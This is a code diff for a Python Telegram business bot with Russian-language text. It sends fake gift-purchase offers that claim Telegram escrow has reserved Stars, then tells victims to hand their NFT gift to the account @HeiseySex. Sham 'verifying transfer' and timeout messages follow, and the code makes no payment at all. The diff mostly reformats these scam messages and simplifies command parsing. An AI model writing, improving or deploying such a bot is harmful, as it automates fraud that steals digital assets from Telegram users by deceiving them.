@@ -42,14 +42,10 @@ def normalize_url(raw):
 
 
 def parse_gift_command(text):
-    """Разбор /gift для Business-чата (улучшенный)."""
-    # Убираем команду и возможные упоминания бота
-    body = re.sub(r'^/gift(@\w+)?\s*', '', text, flags=re.IGNORECASE).strip()
-    
+    body = text.replace("/gift", "", 1).strip()
     if not body:
         return None
 
-    # Сначала ищем кавычки
     quoted = re.findall(r'"([^"]*)"', body)
     without_quotes = re.sub(r'"[^"]*"', "", body).strip()
 
@@ -66,9 +62,9 @@ def parse_gift_command(text):
         parts = body.split()
         if len(parts) < 3:
             return None
-        name = " ".join(parts[:-2]) # Название может состоять из нескольких слов
-        url = normalize_url(parts[-2])
-        amount_part = parts[-1]
+        name = parts[0]
+        url = normalize_url(parts[1])
+        amount_part = parts[2]
 
     amount = re.sub(r"\D", "", amount_part) if amount_part else ""
 
@@ -79,7 +75,6 @@ def parse_gift_command(text):
 
 
 def parse_inline_query(raw):
-    """Разбор строки inline-запроса: Название | ссылка | сумма."""
     parts = [p.strip() for p in re.split(r"[|,]", raw or "") if p.strip()]
     name = parts[0] if len(parts) > 0 else ""
     url_raw = parts[1] if len(parts) > 1 else ""
@@ -89,15 +84,14 @@ def parse_inline_query(raw):
     return name, url, amount
 
 
-# ─────────────────────── ТЕКСТЫ ───────────────────────
+# ─────────────────────── ТЕКСТЫ (С ФОРМАТИРОВАНИЕМ) ───────────────────────
 
 def build_offer_message(name, url, amount):
     return (
-        "🎁 <b>Вам поступило предложение о покупке подарка.</b>\n"
+        "Вам поступило предложение о покупке подарка.\n"
         "━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"Пользователь предлагает вам <b>{amount} ⭐</b> за подарок "
-        f"<a href=\"{url}\"><b>{name}</b></a>.\n\n"
-        "<i>Вы можете принять сделку или отклонить предложение.</i>\n\n"
+        f"Пользователь предлагает вам <b>{amount}</b> ⭐ за подарок "
+        f"<a href=\"{url}\">{name}</a>.\n\n"
         "━━━━━━━━━━━━━━━━━━━━"
     )
 
@@ -113,20 +107,19 @@ def build_offer_keyboard():
 
 def build_escrow_message(name, url, amount):
     return (
-        f"🔒 <b>Средства зарезервированы!</b>\n\n"
-        f"Пользователь зарезервировал <b>{amount} ⭐</b> через "
+        f"Пользователь зарезервировал <b>{amount}</b> ⭐ через "
         "эксроу-систему Telegram. Средства хранятся на специальном "
-        "счёте и будут автоматически зачислены на ваш баланс "
-        "сразу после передачи подарка.\n\n"
+        "эксроу-счёте и будут автоматически зачислены на ваш баланс "
+        "звёзд сразу после передачи подарка.\n\n"
         "━━━━━━━━━━━━━━━━━━━━\n"
-        "📝 <b>Инструкция для завершения сделки:</b>\n\n"
-        "<b>1.</b> Передайте подарок пользователю: @HeiseySex\n"
-        f"<b>2.</b> Нажмите «Передать NFT» и выберите "
-        f"<a href=\"{url}\"><b>{name}</b></a>\n"
-        "<b>3.</b> Подтвердите передачу подарка.\n"
+        "<b>Инструкция для завершения сделки:</b>\n\n"
+        f"1. Передайте подарок пользователю: <b>@HeiseySex</b>\n"
+        f"2. Нажмите «Передать NFT» и выберите "
+        f"<a href=\"{url}\">{name}</a>\n"
+        "3. Подтвердите передачу подарка.\n"
         "━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"<i>Telegram зафиксирует транзакцию и моментально зачислит "
-        f"<b>{amount} ⭐</b> на ваш баланс.</i>"
+        f"Telegram зафиксирует транзакцию и моментально зачислит "
+        f"<b>{amount}</b> ⭐ на ваш баланс."
     )
 
 
@@ -139,38 +132,6 @@ def build_escrow_keyboard():
     )
     return keyboard
 
-
-MSG_VERIFY = (
-    "⏳ <b>Проверка передачи…</b>\n"
-    "━━━━━━━━━━━━━━━━━━━━\n\n"
-    "Система проверяет статус передачи подарка. "
-    "Это может занять несколько минут.\n\n"
-    "<b>Пожалуйста, не закрывайте чат.</b>\n\n"
-    "━━━━━━━━━━━━━━━━━━━━"
-)
-
-MSG_TIMEOUT = (
-    "⛔ <b>Сделка не завершена.</b>\n"
-    "━━━━━━━━━━━━━━━━━━━━\n\n"
-    "Вы не выполнили все условия передачи подарка.\n\n"
-    "Передача не была подтверждена в установленное время, "
-    "поэтому резерв средств был снят, а предложение — "
-    "автоматически аннулировано.\n\n"
-    "<i>Если вы всё ещё хотите завершить сделку, попросите "
-    "пользователя отправить предложение повторно.</i>\n\n"
-    "━━━━━━━━━━━━━━━━━━━━"
-)
-
-MSG_DECLINE = (
-    "❌ <b>Предложение отклонено.</b>\n"
-    "━━━━━━━━━━━━━━━━━━━━\n\n"
-    "Сессия закрыта. Если вы передумаете, "
-    "пользователь может отправить предложение повторно.\n\n"
-    "━━━━━━━━━━━━━━━━━━━━"
-)
-
-
-# ─────────────────────── СЛУЖЕБНЫЕ ОТПРАВКИ ───────────────────────
 
 def try_delete_message(chat_id, message_id, conn_id=None):
     try:
@@ -246,10 +207,23 @@ def send_business_message(chat_id, text, conn_id, reply_markup=None):
 
 # ─────────────────────── ТАЙМЕР ВЕРИФИКАЦИИ ───────────────────────
 
-def schedule_verify_timeout(chat_id, message_id, conn_id=None):
+def schedule_verify_timeout(chat_id, message_id, conn_id):
     def job():
         time.sleep(VERIFY_TIMEOUT_SECONDS)
-        safe_edit(chat_id, message_id, MSG_TIMEOUT, conn_id=conn_id)
+        safe_edit(
+            chat_id,
+            message_id,
+            "⛔ <b>Сделка не завершена.</b>\n"
+            "━━━━━━━━━━━━━━━━━━━━\n\n"
+            "Вы не выполнили все условия передачи подарка.\n\n"
+            "Передача не была подтверждена в установленное время, "
+            "поэтому резерв средств был снят, а предложение — "
+            "автоматически аннулировано.\n\n"
+            "<i>Если вы всё ещё хотите завершить сделку, попросите "
+            "пользователя отправить предложение повторно.</i>\n\n"
+            "━━━━━━━━━━━━━━━━━━━━",
+            conn_id=conn_id,
+        )
         print(f"[VERIFY-TIMEOUT] msg {message_id} обновлён")
 
     t = threading.Thread(target=job, daemon=True)
@@ -268,7 +242,7 @@ def on_business_connection(connection):
     print(f"[BUSINESS] Активно: {connection.is_enabled}")
 
 
-# ─────────────────────── BUSINESS-СООБЩЕНИЯ (/gift) ───────────────────────
+# ─────────────────────── ОСНОВНОЙ ОБРАБОТЧИК ───────────────────────
 
 @bot.business_message_handler(func=lambda m: m.text is not None, content_types=["text"])
 def handle_business_message(message):
@@ -335,7 +309,6 @@ def handle_inline_query(query):
     raw = (query.query or "").strip()
     print(f"[INLINE] от {query.from_user.id}: {raw!r}")
 
-    # Только владелец может создавать офферы
     if query.from_user.id != OWNER_ID:
         bot.answer_inline_query(
             query.id,
@@ -357,7 +330,6 @@ def handle_inline_query(query):
     results = []
 
     if name and url and amount:
-        # Готовый оффер
         results.append(
             InlineQueryResultArticle(
                 id="offer_ready",
@@ -371,7 +343,6 @@ def handle_inline_query(query):
             )
         )
     else:
-        # Подсказки-шаблоны
         results.append(
             _inline_template(
                 "help",
@@ -445,7 +416,12 @@ def callback_router(call):
         safe_edit(
             call.message.chat.id,
             call.message.message_id,
-            MSG_VERIFY,
+            "⏳ <b>Проверка передачи…</b>\n"
+            "━━━━━━━━━━━━━━━━━━━━\n\n"
+            "Система проверяет статус передачи подарка. "
+            "Это может занять несколько минут.\n\n"
+            "Пожалуйста, не закрывайте чат.\n\n"
+            "━━━━━━━━━━━━━━━━━━━━",
             conn_id=conn_id,
         )
         schedule_verify_timeout(
@@ -459,7 +435,11 @@ def callback_router(call):
         safe_edit(
             call.message.chat.id,
             call.message.message_id,
-            MSG_DECLINE,
+            "❌ <b>Предложение отклонено.</b>\n"
+            "━━━━━━━━━━━━━━━━━━━━\n\n"
+            "Сессия закрыта. Если вы передумаете, "
+            "пользователь может отправить предложение повторно.\n\n"
+            "━━━━━━━━━━━━━━━━━━━━",
             conn_id=conn_id,
         )
 
@@ -493,10 +473,8 @@ def run_bot():
     )
 
 if __name__ == "__main__":
-    # Запускаем бота в фоне
     bot_thread = threading.Thread(target=run_bot, daemon=True)
     bot_thread.start()
 
-    # Flask слушает порт, чтобы Render не убивал сервис
     port = int(os.environ.get("PORT", 10000))
     app.run(host="0.0.0.0", port=port)
